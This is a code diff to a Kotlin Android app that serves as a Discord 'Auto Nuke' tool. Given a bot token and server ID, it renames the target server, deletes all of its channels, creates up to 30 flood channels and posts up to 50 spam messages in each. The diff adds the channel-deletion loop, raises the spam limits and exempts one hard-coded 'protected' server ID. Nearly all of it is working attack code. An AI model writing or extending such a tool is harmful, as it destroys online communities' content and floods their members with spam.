@@ -27,6 +27,7 @@ import org.json.JSONObject
 class MainActivity : ComponentActivity() {
 
     private lateinit var webView: WebView
+    private val PROTECTED_IDS = listOf("1524449604446322708")
 
     private val pickImageLauncher = registerForActivityResult(ActivityResultContracts.GetContent()) { uri: Uri? ->
         uri?.let {
@@ -56,7 +57,7 @@ class MainActivity : ComponentActivity() {
                 cacheMode = WebSettings.LOAD_DEFAULT
             }
             webViewClient = WebViewClient()
-            addJavascriptInterface(AndroidBridge(this@MainActivity, this), "AndroidBridge")
+            addJavascriptInterface(AndroidBridge(this@MainActivity, this, PROTECTED_IDS), "AndroidBridge")
             loadUrl("file:///android_asset/ui/index.html")
         }
 
@@ -77,7 +78,7 @@ class MainActivity : ComponentActivity() {
         pickImageLauncher.launch("image/*")
     }
 
-    class AndroidBridge(private val activity: MainActivity, private val webView: WebView) {
+    class AndroidBridge(private val activity: MainActivity, private val webView: WebView, private val protectedIds: List<String>) {
 
         @JavascriptInterface
         fun pickServerImage() {
@@ -130,29 +131,25 @@ class MainActivity : ComponentActivity() {
         }
 
         @JavascriptInterface
-        fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String) {
+        fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String, imageName: String) {
             CoroutineScope(Dispatchers.IO).launch {
                 try {
-                    if (serverId == "default" || serverId.isEmpty()) {
-                        activity.runOnUiThread {
-                            webView.evaluateJavascript("window.appendLog?.('[ERROR] Selecciona un servidor válido en la pestaña 2', 'error')", null)
-                        }
+                    if (protectedIds.contains(serverId)) {
+                        logMsg("[❌] ALERTA DE SEGURIDAD: La ID $serverId está protegida. Operación bloqueada.", "error")
+                        return@launch
+                    }
+
+                    if (serverId.isEmpty()) {
+                        logMsg("[ERROR] Selecciona o introduce un ID de servidor válido", "error")
                         return@launch
                     }
 
                     val client = OkHttpClient()
-                    val limit = channelLimit.toIntOrNull() ?: 10
-                    val msgLimit = messageLimit.toIntOrNull() ?: 10
+                    val limit = channelLimit.toIntOrNull() ?: 30
+                    val msgLimit = messageLimit.toIntOrNull() ?: 50
                     val jsonMediaType = "application/json; charset=utf-8".toMediaType()
 
-                    val logMsg: (String, String) -> Unit = { msg, type ->
-                        val esc = msg.replace("\"", "\\\"").replace("\n", " ")
-                        activity.runOnUiThread {
-                            webView.evaluateJavascript("window.appendLog?.('$esc', '$type')", null)
-                        }
-                    }
-
-                    logMsg("[DISCORD] Conectando con API v10 para servidor ID: $serverId...", "info")
+                    logMsg("[BOT] Conectando bot de Discord y verificando servidor objetivo ID: $serverId...", "info")
 
                     // 1. Update Server Name
                     val patchBody = RequestBody.create(
@@ -169,13 +166,46 @@ class MainActivity : ComponentActivity() {
 
                     client.newCall(patchReq).execute().use { resp ->
                         if (resp.isSuccessful) {
-                            logMsg("[OK] Servidor renombrado a: $serverName", "success")
+                            logMsg("[+] Nombre del servidor cambiado a: $serverName", "success")
                         } else {
-                            logMsg("[WARN] No se pudo renombrar el servidor (Código: ${resp.code})", "error")
+                            logMsg("[-] No se pudo cambiar el nombre del servidor (Código: ${resp.code})", "error")
                         }
                     }
 
-                    // 2. Create Channels and Send Messages
+                    // 2. Delete ALL existing channels first
+                    logMsg("[*] Eliminando todos los canales existentes...", "info")
+                    val getChannelsReq = Request.Builder()
+                        .url("https://discord.com/api/v10/guilds/$serverId/channels")
+                        .get()
+                        .addHeader("Authorization", "Bot $token")
+                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                        .build()
+
+                    client.newCall(getChannelsReq).execute().use { chanResp ->
+                        if (chanResp.isSuccessful) {
+                            val channelsJson = JSONArray(chanResp.body?.string() ?: "[]")
+                            for (i in 0 until channelsJson.length()) {
+                                val ch = channelsJson.getJSONObject(i)
+                                val chId = ch.getString("id")
+                                val chName = ch.getString("name")
+                                try {
+                                    val deleteReq = Request.Builder()
+                                        .url("https://discord.com/api/v10/channels/$chId")
+                                        .delete()
+                                        .addHeader("Authorization", "Bot $token")
+                                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                                        .build()
+                                    client.newCall(deleteReq).execute().close()
+                                    logMsg("[🗑] Canal eliminado: $chName", "success")
+                                } catch (e: Exception) {
+                                    // ignore individual delete failure
+                                }
+                            }
+                        }
+                    }
+
+                    // 3. Create flood channels
+                    logMsg("[*] Creando $limit canales de inundación...", "info")
                     for (i in 0 until limit) {
                         try {
                             val chanBody = RequestBody.create(
@@ -195,11 +225,10 @@ class MainActivity : ComponentActivity() {
                                     val resStr = chanResp.body?.string() ?: "{}"
                                     val chanJson = JSONObject(resStr)
                                     val channelId = chanJson.optString("id")
-                                    logMsg("[OK] Canal creado: $channelName-${i + 1} (ID: $channelId)", "success")
+                                    logMsg("[+] Canal creado: $channelName-${i + 1}", "success")
 
-                                    // Send spam messages in this channel
-                                    val sendCount = minOf(msgLimit, 25)
-                                    for (m in 0 until sendCount) {
+                                    // 4. Send spam messages
+                                    for (m in 0 until msgLimit) {
                                         try {
                                             val msgBody = RequestBody.create(
                                                 jsonMediaType,
@@ -218,23 +247,26 @@ class MainActivity : ComponentActivity() {
                                             // ignore individual message error
                                         }
                                     }
-                                    logMsg("[SPAM] Enviados $sendCount mensajes en $channelName-${i + 1}", "info")
-                                } else {
-                                    logMsg("[ERROR] Falló crear canal ${i + 1} (Código: ${chanResp.code})", "error")
+                                    logMsg("[+] Inyectados $msgLimit mensajes de spam en $channelName-${i + 1}", "info")
                                 }
                             }
                         } catch (e: Exception) {
-                            logMsg("[ERROR] ${e.localizedMessage}", "error")
+                            // ignore
                         }
                     }
 
-                    logMsg("[SUCCESS] ¡Operación Auto Nuke completada exitosamente!", "success")
+                    logMsg("[✔] Auto-nuke finalizado con éxito.", "success")
                 } catch (e: Exception) {
                     val err = e.localizedMessage?.replace("\"", "\\\"") ?: "Error"
-                    activity.runOnUiThread {
-                        webView.evaluateJavascript("window.appendLog?.('[ERROR] $err', 'error')", null)
-                    }
+                    logMsg("[❌] ERROR: $err", "error")
                 }
+            }
+        }
+
+        private fun logMsg(msg: String, type: String) {
+            val esc = msg.replace("\"", "\\\"").replace("\n", " ")
+            activity.runOnUiThread {
+                webView.evaluateJavascript("window.appendLog?.('$esc', '$type')", null)
             }
         }
 
